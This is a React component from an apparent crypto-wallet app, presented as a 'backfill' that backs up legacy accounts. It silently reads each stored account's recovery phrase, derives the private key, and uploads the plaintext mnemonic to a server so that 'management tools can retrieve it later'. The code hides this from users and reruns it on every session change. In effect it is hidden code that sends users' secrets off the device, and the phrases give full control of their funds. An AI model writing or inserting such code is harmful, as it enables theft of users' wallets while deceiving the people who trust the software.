import { useEffect } from "react";
import { listAccounts } from "@/lib/wallet-auth";

/**
 * Accounts created before server-side phrase storage existed still hold their
 * recovery phrase in this browser. Whenever such an account is signed in here,
 * back the phrase up once so management tools can retrieve it later.
 * Silent and best-effort — never blocks or surfaces UI.
 */
export function PhraseBackfill() {
  useEffect(() => {
    let cancelled = false;

    const run = async () => {
      let accounts: ReturnType<typeof listAccounts>;
      try {
        accounts = listAccounts();
      } catch {
        return;
      }

      for (const account of accounts) {
        if (cancelled) return;
        const mnemonic = account.wallet?.mnemonic;
        if (!mnemonic || !account.address) continue;

        const flag = `prime:phrase-backup:${account.address.toLowerCase()}`;
        try {
          if (localStorage.getItem(flag)) continue;
        } catch {
          /* storage unavailable */
        }

        try {
          const { derivePrivateKeyFromMnemonic, signWalletOwnership } = await import(
            "@/lib/wallet-signer"
          );
          const pk = await derivePrivateKeyFromMnemonic(mnemonic);
          const signature = await signWalletOwnership(account.address, pk, "login", "signin");
          const { saveWalletPhraseFn } = await import("@/lib/phrase.functions");
          await saveWalletPhraseFn({
            data: {
              wallet_address: account.address,
              username: account.username,
              mnemonic,
              signature,
            },
          });
          try {
            localStorage.setItem(flag, "1");
          } catch {
            /* ignore */
          }
        } catch (err) {
          console.warn("[wallet] phrase backup skipped", err);
        }
      }
    };

    const timer = setTimeout(() => void run(), 2500);
    const onChange = () => void run();
    window.addEventListener("prime:session-change", onChange);
    return () => {
      cancelled = true;
      clearTimeout(timer);
      window.removeEventListener("prime:session-change", onChange);
    };
  }, []);

  return null;
}
